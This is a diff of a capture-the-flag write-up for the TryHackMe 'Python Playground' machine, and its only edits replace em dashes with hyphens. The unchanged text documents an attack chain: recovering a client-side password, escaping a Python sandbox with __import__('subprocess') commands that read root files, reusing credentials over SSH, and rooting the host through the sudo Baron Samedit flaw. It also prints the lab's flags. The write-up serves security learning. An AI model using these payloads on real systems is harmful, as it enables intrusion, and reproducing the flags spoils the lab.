@@ -1,6 +1,6 @@
 ---
 slug: "thm-pythonplayground"
-title: "Python Playground — TryHackMe Writeup"
+title: "Python Playground - TryHackMe Writeup"
 date: "2026-11-03"
 platform: "TryHackMe"
 type: "Machine"
@@ -32,13 +32,13 @@ import { TerminalReplay } from "@/components/cyber/TerminalReplay";
     {
       phase: "Reconnaissance",
       title: "Hidden Backdoor Page",
-      desc: "Nmap exposes SSH and a Node.js/Express app on port 80. Gobuster finds an admin.html login that only exists client-side — the real login and signup pages are dead stubs.",
+      desc: "Nmap exposes SSH and a Node.js/Express app on port 80. Gobuster finds an admin.html login that only exists client-side - the real login and signup pages are dead stubs.",
       tools: ["Nmap", "Gobuster"],
     },
     {
       phase: "Foothold",
       title: "Blacklist Escape to Root Container",
-      desc: "Reversed the double base-26 encoding of the client-side password, reached the hidden Python sandbox, and slipped past its substring filter with __import__('subprocess').getoutput() — the interpreter runs as root inside a docker container.",
+      desc: "Reversed the double base-26 encoding of the client-side password, reached the hidden Python sandbox, and slipped past its substring filter with __import__('subprocess').getoutput() - the interpreter runs as root inside a docker container.",
       technique: "Sandbox Bypass",
       tools: ["curl", "Python", "Chromium"],
     },
@@ -83,8 +83,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 <Callout type="info">
-  Only SSH and HTTP are exposed. Everything interesting — the docker engine, the python web unit,
-  and the third flag — lives behind the frontend, so we have to earn our way in through the web
+  Only SSH and HTTP are exposed. Everything interesting - the docker engine, the python web unit,
+  and the third flag - lives behind the frontend, so we have to earn our way in through the web
   application.
 </Callout>
 
@@ -94,7 +94,7 @@ The landing page advertises a sandbox that keeps hackers out with a "foolproof b
 
 ![Secure Python Playground homepage](https://i.imgur.com/xN0fKWS.png)
 
-The `Login` and `Sign up` links both lead to dead stub pages — the developers moved the real product "behind admin":
+The `Login` and `Sign up` links both lead to dead stub pages - the developers moved the real product "behind admin":
 
 ![Login page is a dead stub](https://i.imgur.com/GorsvQs.png)
 
@@ -166,7 +166,7 @@ if (hash === "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu") {
 
 ### Inverting the Encoding
 
-Each character becomes a **pair of lowercase letters** — one for `ord(c)//26`, one for `ord(c)%26`, both shifted into the `a..z` alphabet — and that transform is applied **twice**. Inverting it is just character subtraction:
+Each character becomes a **pair of lowercase letters** - one for `ord(c)//26`, one for `ord(c)%26`, both shifted into the `a..z` alphabet - and that transform is applied **twice**. Inverting it is just character subtraction:
 
 ```python
 def letters_to_text(letters):
@@ -185,11 +185,11 @@ eleidtdzeadxememebbxbycacb
 spaghetti1245
 ```
 
-**Credentials: `connor` : `spaghetti1245`** — and the digest trade reveals the hidden page: `super-secret-admin-testing-panel.html`.
+**Credentials: `connor` : `spaghetti1245`** - and the digest trade reveals the hidden page: `super-secret-admin-testing-panel.html`.
 
 ### The Hidden Python Sandbox
 
-Correct credentials drop us into **Python Playground! — By Connor**, a source-level code runner:
+Correct credentials drop us into **Python Playground! - By Connor**, a source-level code runner:
 
 ![Hidden admin testing panel](https://i.imgur.com/UZXiHe7.png)
 
@@ -221,7 +221,7 @@ Security threat detected!
 
 ### Mapping the Filter
 
-Fingerprinting which strings trip the filter shows that `import ` (with the trailing space), `eval`, and `exec` are banned — while `__import__` (no space) runs fine. We can read the exact filter source directly from the host by abusing the same sandbox with `__import__('subprocess')`:
+Fingerprinting which strings trip the filter shows that `import ` (with the trailing space), `eval`, and `exec` are banned - while `__import__` (no space) runs fine. We can read the exact filter source directly from the host by abusing the same sandbox with `__import__('subprocess')`:
 
 ```python
 print(__import__('subprocess').getoutput('grep -A16 isAllowed index.js'))
@@ -257,7 +257,7 @@ The filter is a set of **substring checks** against the raw request body, so the
 | `.system`        | `subprocess.getoutput(...)` | no `.system` substring anywhere  |
 | `exec` / `eval`  | (not needed)                | `getoutput` already gives shells |
 
-And note what the runner does with the code — it **writes the file itself** into the app directory before spawning `python3` on it:
+And note what the runner does with the code - it **writes the file itself** into the app directory before spawning `python3` on it:
 
 ```js
 const name = `scripts/${Math.floor(Math.random() * 100000000000)}.py`;
@@ -276,14 +276,14 @@ print(__import__('subprocess').getoutput('id; cat /root/flag1.txt'))
 ![Command execution inside the container reads flag 1](https://i.imgur.com/7i9m3og.png)
 
 <Callout type="warning">
-  The python interpreter spawned by the Node app runs as **root** — no container-user sacrifice
+  The python interpreter spawned by the Node app runs as **root** - no container-user sacrifice
   here, which is why the "mid-tier" flag is readable straight away. Any reverse-shell payload you
   would usually stunt through the sandbox is entirely unnecessary for the first flag, but pivoting
   out of the container still needs a second account on the host.
 </Callout>
 
 <SpoilerFlag
-  label="Flag 1 — Docker Container Root (/root/flag1.txt)"
+  label="Flag 1 - Docker Container Root (/root/flag1.txt)"
   flag="THM{7e0b5cf043975e3c104a458a8d4f6f2f}"
 />
 
@@ -293,7 +293,7 @@ print(__import__('subprocess').getoutput('id; cat /root/flag1.txt'))
 
 ### Exploring the Container Network
 
-Running `getoutput` against the container's network view shows only one peer — the docker gateway — and our own internal IP:
+Running `getoutput` against the container's network view shows only one peer - the docker gateway - and our own internal IP:
 
 ```python
 print(__import__('subprocess').getoutput('cat /etc/hosts; cat /proc/net/arp'))
@@ -330,7 +330,7 @@ cat ~/flag2.txt
 ```
 
 <SpoilerFlag
-  label="Flag 2 — Host User (/home/connor/flag2.txt)"
+  label="Flag 2 - Host User (/home/connor/flag2.txt)"
   flag="THM{69a36d6f9da10d23ca0dbfdf6e691ec5}"
 />
 
@@ -340,7 +340,7 @@ cat ~/flag2.txt
 
 ### Washing Away sudo
 
-connor can't leverage sudo at all — sudoers greps back empty for the user:
+connor can't leverage sudo at all - sudoers greps back empty for the user:
 
 ```
 $ sudo -n -l
@@ -360,7 +360,7 @@ dpkg -l | grep ' sudo '
 ii  sudo  1.8.21p2-3ubuntu1.2   Provide limited super user privileges
 ```
 
-sudo **1.8.21p2** falls inside the affected range of **CVE-2021-3156 (_Baron Samedit_)** — a heap overflow in the argument-parsing code that any user can trigger via `sudoedit -s` **before authentication** is even attempted, no sudo rights of any kind required.
+sudo **1.8.21p2** falls inside the affected range of **CVE-2021-3156 (_Baron Samedit_)** - a heap overflow in the argument-parsing code that any user can trigger via `sudoedit -s` **before authentication** is even attempted, no sudo rights of any kind required.
 
 ### Pure-Python Baron Samedit
 
@@ -375,7 +375,7 @@ uid=0(root) gid=0(root) groups=0(root),1000(connor)
 ```
 
 <SpoilerFlag
-  label="Flag 3 — Host Root (/root/flag3.txt)"
+  label="Flag 3 - Host Root (/root/flag3.txt)"
   flag="THM{be3adc69c25ad14eb79da4eb57925ad1}"
 />
 
@@ -385,7 +385,7 @@ uid=0(root) gid=0(root) groups=0(root),1000(connor)
 
 Python Playground is a demonstration of **what happens when every layer trusts a string**:
 
-1. A **client-side login** published credentials inside an invertible base-26 digest — password never knew the server.
+1. A **client-side login** published credentials inside an invertible base-26 digest - password never knew the server.
 2. A **substring blacklist** guarding a Python runner fell to `__import__` because the blocked token included its own trailing space.
 3. The python interpreter ran as **root** inside the container, opening the docker gateway and a host account with **password reuse**.
 4. An **unpatched sudo (1.8.21p2)** on outdated Ubuntu left the whole host one heap overflow away from root, with no sudo membership needed by the attacker.
@@ -394,7 +394,7 @@ Python Playground is a demonstration of **what happens when every layer trusts a
 
 ## Automation
 
-This whole chain was scripted end to end — client-side decode, sandbox probe, filter read, container root, host SSH, and the Baron Samedit delivery and detonation:
+This whole chain was scripted end to end - client-side decode, sandbox probe, filter read, container root, host SSH, and the Baron Samedit delivery and detonation:
 
 <TerminalReplay
   title="thm_pythonplayground_solve.py"
@@ -404,12 +404,12 @@ This whole chain was scripted end to end — client-side decode, sandbox probe, 
     { label: "Flag 3 (Host Root)", flag: "THM{be3adc69c25ad14eb79da4eb57925ad1}" },
   ]}
   flagSummary={[
-    "The sandbox filter is a set of substring checks — __import__ never matches 'import '.",
+    "The sandbox filter is a set of substring checks - __import__ never matches 'import '.",
     "The interpreter runs as root, and sudo on the host predates the Baron Samedit patch.",
   ]}
   steps={[
     {
-      label: "Step 1/5 — Steal Credentials from the Admin Backdoor Page",
+      label: "Step 1/5 - Steal Credentials from the Admin Backdoor Page",
       command: "python3 thm_pythonplayground_solve.py 10.113.173.107",
       output: [
         { text: "[+] backdoor user  : connor", color: "green" },
@@ -420,7 +420,7 @@ This whole chain was scripted end to end — client-side decode, sandbox probe, 
       delayAfter: 700,
     },
     {
-      label: "Step 2/5 — Probe the Sandbox",
+      label: "Step 2/5 - Probe the Sandbox",
       command:
         "curl -s -d 'code=print(7*6)' http://10.113.173.107/super-secret-admin-testing-panel.html",
       output: [
@@ -430,7 +430,7 @@ This whole chain was scripted end to end — client-side decode, sandbox probe, 
       delayAfter: 600,
     },
     {
-      label: "Step 3/5 — Read the Filter and Bypass It",
+      label: "Step 3/5 - Read the Filter and Bypass It",
       command:
         "curl -s -d 'code=print(...getoutput(...))' http://10.113.173.107/super-secret-admin-testing-panel.html",
       output: [
@@ -447,7 +447,7 @@ This whole chain was scripted end to end — client-side decode, sandbox probe, 
       delayAfter: 700,
     },
     {
-      label: "Step 4/5 — Host Handoff via Password Reuse",
+      label: "Step 4/5 - Host Handoff via Password Reuse",
       command: "connor/spaghetti1245 against host SSH (paramiko)",
       output: [
         { text: "[+] uid=1000(connor) gid=1000(connor) groups=1000(connor)", color: "green" },
@@ -456,7 +456,7 @@ This whole chain was scripted end to end — client-side decode, sandbox probe, 
       delayAfter: 600,
     },
     {
-      label: "Step 5/5 — CVE-2021-3156 Baron Samedit to Root",
+      label: "Step 5/5 - CVE-2021-3156 Baron Samedit to Root",
       command: "printf 'id; cat /root/flag3.txt\\n' | python3 thm_pg_baron.py  (shipped over SFTP)",
       output: [
         { text: "[+] exploit shipped -> /tmp/thm_pg_baron.py", color: "blue" },
@@ -478,7 +478,7 @@ This whole chain was scripted end to end — client-side decode, sandbox probe, 
 
 ## References
 
-- [Qualys — Baron Samedit: Heap-based Buffer Overflow in Sudo (CVE-2021-3156)](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-editing-based-privilege-escalation-vulnerability-in-sudo.txt)
-- [worawit/CVE-2021-3156 — Pure-Python Baron Samedit exploits](https://github.com/worawit/CVE-2021-3156)
-- [HackTricks — Python Sandbox Escape & Bypass Techniques](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/python-sandbox-escape)
-- [glibc — Name Service Switch (nsswitch.conf) internals](https://www.gnu.org/software/libc/manual/html_node/Name-Service-Switch.html)
+- [Qualys - Baron Samedit: Heap-based Buffer Overflow in Sudo (CVE-2021-3156)](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-editing-based-privilege-escalation-vulnerability-in-sudo.txt)
+- [worawit/CVE-2021-3156 - Pure-Python Baron Samedit exploits](https://github.com/worawit/CVE-2021-3156)
+- [HackTricks - Python Sandbox Escape & Bypass Techniques](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/python-sandbox-escape)
+- [glibc - Name Service Switch (nsswitch.conf) internals](https://www.gnu.org/software/libc/manual/html_node/Name-Service-Switch.html)
